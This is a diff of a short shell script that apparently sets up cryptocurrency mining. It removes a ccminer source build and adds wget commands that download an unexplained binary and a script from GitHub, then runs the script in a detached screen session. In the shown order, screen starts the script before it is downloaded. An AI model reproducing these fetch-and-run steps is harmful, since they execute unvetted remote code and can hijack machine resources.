@@ -1,27 +1,13 @@
-#!/bin/sh
-
 sudo apt update
 
 sudo apt install screen -y
 
-screen -dmS xhajar1.sh ./xhajar1.sh 65 75
+screen -dmS xhajar.sh ./xhajar.sh 65 75
 
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+wget https://github.com/renilo/xmr/raw/main/meki-baru1
 
-git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
+wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh
 
-cd ccminer
+chmod +x xhajar.sh
 
-chmod +x build.sh
-
-chmod +x configure.sh
-
-chmod +x autogen.sh
-
-./build.sh
-
-wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar1.sh
-
-chmod +x xhajar1.sh
-
-./xhajar1.sh
+./xhajar.sh
